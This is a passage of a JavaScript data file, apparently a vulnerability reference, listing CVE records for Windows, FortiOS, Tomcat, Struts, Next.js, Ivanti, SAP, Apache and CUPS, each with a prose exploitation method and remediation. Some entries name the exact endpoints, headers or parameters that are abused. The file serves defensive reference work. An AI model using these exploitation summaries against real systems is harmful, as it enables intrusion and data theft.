    affected: "Windows 10, Windows 11, Windows Server 2016 through 2025",
    description: "Remote code execution via Object Linking and Embedding (OLE) in Windows. A specially crafted email can trigger the vulnerability when previewed in Microsoft Outlook.",
    exploitation: "Send a crafted email with a malicious OLE object that triggers code execution when the email is previewed in Outlook's reading pane, requiring no user interaction beyond receiving the email.",
    remediation: "Apply the January 2025 Microsoft security updates. Read emails in plain text as a mitigation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-21298"]
  },
  {
    id: "CVE-2025-21293",
    name: "Windows Active Directory Domain Services Privilege Escalation",
    severity: "High",
    cvss: 8.8,
    affected: "Windows Server 2016 through 2025 with Active Directory",
    description: "Privilege escalation in Active Directory Domain Services allowing a domain user to escalate to SYSTEM on a domain controller through abuse of the Performance Monitor Users group.",
    exploitation: "Leverage membership in the Performance Monitor Users group (or add an account to it) to load arbitrary DLLs through the AD performance counter mechanism.",
    remediation: "Apply the January 2025 Microsoft security updates. Audit membership of the Performance Monitor Users group.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-21293"]
  },
  {
    id: "CVE-2024-55591",
    name: "FortiOS Authentication Bypass via Node.js Websocket",
    severity: "Critical",
    cvss: 9.8,
    affected: "FortiOS 7.0.0 to 7.0.16, FortiProxy 7.0.0 to 7.0.19, 7.2.0 to 7.2.12",
    description: "Authentication bypass in FortiOS and FortiProxy via crafted requests to the Node.js websocket module, allowing unauthenticated attackers to gain super-admin privileges.",
    exploitation: "Send crafted requests to the FortiGate/FortiProxy administrative interface via the Node.js websocket path to bypass authentication and gain super-admin access.",
    remediation: "Upgrade to FortiOS 7.0.17 or later, FortiProxy 7.0.20 or 7.2.13. Disable HTTP/HTTPS administrative access on the WAN interface.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-55591"]
  },
  {
    id: "CVE-2025-24813",
    name: "Apache Tomcat Partial PUT Deserialization RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Tomcat 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0-M1 to 9.0.98",
    description: "Remote code execution in Apache Tomcat via deserialization of session data. If the default servlet is configured to allow writes and partial PUT is enabled, an attacker can upload a serialized session file.",
    exploitation: "Use a partial PUT request to upload a crafted serialized Java session file, then trigger deserialization by referencing the session ID in a subsequent request.",
    remediation: "Upgrade to Apache Tomcat 11.0.3, 10.1.35, or 9.0.99. Disable partial PUT support. Disable the default servlet write capability.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-24813"]
  },
  {
    id: "CVE-2024-53677",
    name: "Apache Struts File Upload Path Traversal",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Struts 2.0.0 to 6.3.0.2",
    description: "Critical path traversal in the file upload mechanism of Apache Struts allowing attackers to upload files to arbitrary locations, potentially achieving remote code execution.",
    exploitation: "Manipulate file upload parameters to traverse the file system and write malicious files (such as web shells) to arbitrary server paths.",
    remediation: "Upgrade to Apache Struts 6.4.0 or later. Migrate to the new file upload mechanism (Action File Upload).",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-53677"]
  },
  {
    id: "CVE-2025-29927",
    name: "Next.js Middleware Authorization Bypass",
    severity: "Critical",
    cvss: 9.1,
    affected: "Next.js 11.1.4 to 13.5.6, 14.x before 14.2.25, 15.x before 15.2.3",
    description: "Authorization bypass in Next.js middleware. The x-middleware-subrequest header can be used to skip middleware execution entirely, bypassing authentication and authorization checks.",
    exploitation: "Send HTTP requests with the x-middleware-subrequest header set to the middleware module path, causing Next.js to skip all middleware processing including authentication checks.",
    remediation: "Upgrade to Next.js 14.2.25 or 15.2.3. Block external x-middleware-subrequest headers at the reverse proxy/WAF level.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-29927"]
  },
  {
    id: "CVE-2025-22457",
    name: "Ivanti Connect Secure Stack Buffer Overflow (April 2025)",
    severity: "Critical",
    cvss: 9.0,
    affected: "Ivanti Connect Secure before 22.7R2.6, Ivanti Policy Secure before 22.7R1.4",
    description: "Stack-based buffer overflow in Ivanti Connect Secure and Policy Secure appliances allowing unauthenticated remote code execution. Exploited in the wild by China-nexus threat actors.",
    exploitation: "Send crafted requests to the Ivanti appliance to overflow a stack buffer and achieve remote code execution without authentication.",
    remediation: "Upgrade to Ivanti Connect Secure 22.7R2.6 or Policy Secure 22.7R1.4. Factory reset compromised appliances.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-22457"]
  },
  {
    id: "CVE-2025-31324",
    name: "SAP NetWeaver Unrestricted File Upload",
    severity: "Critical",
    cvss: 10.0,
    affected: "SAP NetWeaver Application Server Java (Visual Composer)",
    description: "Unrestricted file upload in SAP NetWeaver Visual Composer allowing unauthenticated attackers to upload and execute arbitrary files on the server, leading to full system compromise.",
    exploitation: "Upload a malicious JSP web shell to the SAP NetWeaver server through the Visual Composer metadata uploader endpoint without authentication.",
    remediation: "Apply SAP Security Note 3594142. Disable the Visual Composer component if not in use. Monitor for web shells in the upload directories.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-31324"]
  },

  // ============================================================
  // ADDITIONAL WEB / APPLICATION VULNERABILITIES
  // ============================================================

  {
    id: "CVE-2019-0211",
    name: "Apache HTTP Server Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Apache HTTP Server 2.4.17 to 2.4.38",
    description: "Privilege escalation in Apache HTTP Server where a less-privileged child process can execute arbitrary code with root privileges by manipulating the scoreboard shared memory area.",
    exploitation: "From a compromised Apache worker process, manipulate the shared memory scoreboard to redirect function pointers and execute arbitrary code as root during a graceful restart.",
    remediation: "Upgrade to Apache HTTP Server 2.4.39 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-0211"]
  },
  {
    id: "CVE-2021-41773",
    name: "Apache HTTP Server Path Traversal",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache HTTP Server 2.4.49",
    description: "Path traversal vulnerability in Apache HTTP Server allowing attackers to access files outside the expected document root using encoded path traversal sequences.",
    exploitation: "Send HTTP requests with URL-encoded dot-dot-slash sequences that bypass the path normalization in Apache 2.4.49 to read files outside the document root or execute CGI scripts.",
    remediation: "Upgrade to Apache HTTP Server 2.4.51 or later. The 2.4.50 fix was incomplete (CVE-2021-42013).",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"]
  },
  {
    id: "CVE-2021-42013",
    name: "Apache HTTP Server Path Traversal (2.4.50 Bypass)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache HTTP Server 2.4.49, 2.4.50",
    description: "Insufficient fix for CVE-2021-41773 in Apache HTTP Server 2.4.50. Double-encoded path traversal sequences still bypass the normalization and allow RCE via CGI.",
    exploitation: "Send HTTP requests with double-encoded path traversal sequences that bypass the initial fix in 2.4.50 to read arbitrary files or execute CGI scripts.",
    remediation: "Upgrade to Apache HTTP Server 2.4.51 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"]
  },
  {
    id: "CVE-2020-11978",
    name: "Apache Airflow DAG Example Command Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Airflow before 1.10.11",
    description: "Remote code execution in Apache Airflow through the example DAG example_trigger_target_dag. Command injection via the configuration parameter allows arbitrary command execution.",
    exploitation: "Trigger the example DAG with a crafted configuration parameter containing shell metacharacters to execute arbitrary commands on the Airflow worker.",
    remediation: "Upgrade to Apache Airflow 1.10.11 or later. Remove example DAGs from production deployments.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-11978"]
  },
  {
    id: "CVE-2020-17519",
    name: "Apache Flink Directory Traversal",
    severity: "High",
    cvss: 7.5,
    affected: "Apache Flink 1.11.0, 1.11.1, 1.11.2",
    description: "Directory traversal in the REST API of Apache Flink's JobManager allowing remote attackers to read any file on the local filesystem through crafted requests.",
    exploitation: "Send crafted GET requests to the Flink REST API with directory traversal sequences to read arbitrary files from the JobManager host.",
    remediation: "Upgrade to Apache Flink 1.11.3 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-17519"]
  },
  {
    id: "CVE-2019-16759",
    name: "vBulletin Pre-Auth RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "vBulletin 5.x through 5.5.4",
    description: "Remote code execution in vBulletin forum software via the widget system. An unauthenticated attacker can execute PHP code through the template rendering engine.",
    exploitation: "Send a crafted POST request to the ajax/render/widget_php endpoint with PHP code in the widgetConfig parameter.",
    remediation: "Apply the vBulletin security patch. Upgrade to vBulletin 5.5.5 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-16759"]
  },
  {
    id: "CVE-2020-36188",
    name: "Jackson Databind Deserialization RCE",
    severity: "High",
    cvss: 8.1,
    affected: "FasterXML Jackson Databind before 2.9.10.8",
    description: "Remote code execution via unsafe deserialization when polymorphic type handling is enabled in Jackson Databind. Multiple gadget classes can be exploited.",
    exploitation: "Send crafted JSON payloads containing polymorphic type references to deserialization endpoints, triggering code execution through known gadget chains.",
    remediation: "Upgrade Jackson Databind to 2.9.10.8 or later. Disable default typing. Use a whitelist for polymorphic type handling.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-36188"]
  },
  {
    id: "CVE-2020-1938",
    name: "Ghostcat (Apache Tomcat AJP)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Tomcat 6.x, 7.x before 7.0.100, 8.x before 8.5.51, 9.x before 9.0.31",
    description: "File read and potential remote code execution via the Apache JServ Protocol (AJP) in Apache Tomcat. The AJP connector allows reading web application files and processing JSP code.",
    exploitation: "Connect to the AJP port (default 8009) and send crafted AJP requests to read files within the web application or achieve code execution through JSP processing.",
    remediation: "Upgrade to Apache Tomcat 7.0.100, 8.5.51, or 9.0.31. Disable AJP connector if not in use. Configure AJP to require a secret.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-1938"]
  },
  {
    id: "CVE-2023-46604",
    name: "Apache ActiveMQ RCE",
    severity: "Critical",
    cvss: 10.0,
    affected: "Apache ActiveMQ before 5.15.16, 5.16.x before 5.16.7, 5.17.x before 5.17.6, 5.18.x before 5.18.3",
    description: "Remote code execution in Apache ActiveMQ via the OpenWire protocol. An attacker can exploit serialized class types in the OpenWire protocol to execute arbitrary shell commands.",
    exploitation: "Send a crafted OpenWire protocol message to the ActiveMQ broker that triggers instantiation of a class leading to arbitrary command execution.",
    remediation: "Upgrade to Apache ActiveMQ 5.15.16, 5.16.7, 5.17.6, or 5.18.3.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-46604"]
  },
  {
    id: "CVE-2023-50164",
    name: "Apache Struts File Upload Path Traversal (2023)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Struts 2.0.0 to 2.5.32, 6.0.0 to 6.3.0",
    description: "Path traversal in the file upload mechanism of Apache Struts allowing attackers to manipulate file upload parameters to write files to arbitrary locations on the server.",
    exploitation: "Send crafted multipart file upload requests with manipulated path parameters to write web shells or other malicious files to the server.",
    remediation: "Upgrade to Apache Struts 2.5.33 or 6.3.0.2.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-50164"]
  },
  {
    id: "CVE-2024-40711",
    name: "Veeam Backup and Replication Deserialization RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Veeam Backup and Replication before 12.2.0.334",
    description: "Unauthenticated remote code execution in Veeam Backup and Replication via deserialization of untrusted data. Widely targeted by ransomware operators.",
    exploitation: "Send crafted requests to the Veeam Backup server containing malicious serialized objects that achieve code execution during deserialization.",
    remediation: "Upgrade to Veeam Backup and Replication 12.2 (build 12.2.0.334) or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-40711"]
  },
  {
    id: "CVE-2024-29847",
    name: "Ivanti EPM Agent Portal Deserialization RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Ivanti Endpoint Manager before 2022 SU6 and 2024 September update",
    description: "Deserialization of untrusted data in the Ivanti Endpoint Manager Agent Portal allowing unauthenticated remote code execution.",
    exploitation: "Send crafted requests containing malicious serialized .NET objects to the EPM Agent Portal to achieve code execution on the server.",
    remediation: "Apply the Ivanti EPM 2022 SU6 or 2024 September update.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-29847"]
  },
  {
    id: "CVE-2024-28995",
    name: "SolarWinds Serv-U Directory Traversal",
    severity: "High",
    cvss: 8.6,
    affected: "SolarWinds Serv-U before 15.4.2 HF 2",
    description: "Directory traversal in SolarWinds Serv-U FTP server allowing unauthenticated attackers to read arbitrary files on the server filesystem.",
    exploitation: "Send crafted HTTP requests with directory traversal sequences to the Serv-U web interface to read sensitive files including configuration and credential data.",
    remediation: "Upgrade to SolarWinds Serv-U 15.4.2 HF 2 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-28995"]
  },
  {
    id: "CVE-2024-23222",
    name: "Apple WebKit Type Confusion",
    severity: "High",
    cvss: 8.8,
    affected: "iOS before 17.3, iPadOS before 17.3, macOS Sonoma before 14.3, Safari before 17.3",
    description: "Type confusion in Apple WebKit allowing arbitrary code execution via processing maliciously crafted web content. Exploited in the wild.",
    exploitation: "Serve crafted web content that triggers a type confusion in the WebKit JavaScript engine, leading to code execution in the browser context.",
    remediation: "Update to iOS/iPadOS 17.3, macOS 14.3, or Safari 17.3.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-23222"]
  },
  {
    id: "CVE-2024-21413",
    name: "Microsoft Outlook Moniker Link RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps",
    description: "Remote code execution in Microsoft Outlook via a crafted hyperlink using the file:// moniker with an exclamation mark that bypasses Outlook's Protected View security.",
    exploitation: "Send an email containing a specially crafted hyperlink that bypasses Outlook's security restrictions and executes code when the user clicks the link.",
    remediation: "Apply the February 2024 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-21413"]
  },
  {
    id: "CVE-2025-24054",
    name: "Windows NTLM Hash Disclosure via .library-ms",
    severity: "Medium",
    cvss: 6.5,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2025",
    description: "NTLM hash disclosure in Windows when a user navigates to a folder containing a crafted .library-ms file. The file triggers an automatic SMB authentication to an attacker-controlled server.",
    exploitation: "Place a crafted .library-ms file in a directory or archive. When the victim browses to the folder, Windows automatically sends an NTLM authentication request to the attacker's server.",
    remediation: "Apply the March 2025 Microsoft security updates. Block outbound NTLM traffic to external networks.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-24054"]
  },
  {
    id: "CVE-2025-24071",
    name: "Windows File Explorer NTLM Leak via .nfo File",
    severity: "Medium",
    cvss: 6.5,
    affected: "Windows 10, Windows 11, Windows Server 2016 through 2025",
    description: "Information disclosure in Windows File Explorer where extracting a compressed archive containing a crafted .nfo file causes Windows to send NTLM credentials to an attacker-controlled server.",
    exploitation: "Distribute a ZIP archive containing a .nfo or similar metadata file with a UNC path reference that triggers automatic NTLM authentication upon extraction.",
    remediation: "Apply the March 2025 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2025-24071"]
  },
  {
    id: "CVE-2024-47176",
    name: "CUPS cups-browsed IPP Request Processing RCE",
    severity: "Critical",
    cvss: 9.9,
    affected: "CUPS cups-browsed before 2.1b1 on Linux/Unix systems",
    description: "Remote code execution in the CUPS printing system's cups-browsed service. An attacker can send crafted IPP requests that cause cups-browsed to create a malicious printer definition with a PPD file containing arbitrary commands.",
    exploitation: "Send crafted UDP packets to the cups-browsed service on port 631 that register a malicious IPP printer. When a user prints to this printer, arbitrary commands execute.",
    remediation: "Disable and stop the cups-browsed service. Block UDP port 631 from untrusted networks. Update CUPS when patches are available.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-47176"]
  }
];
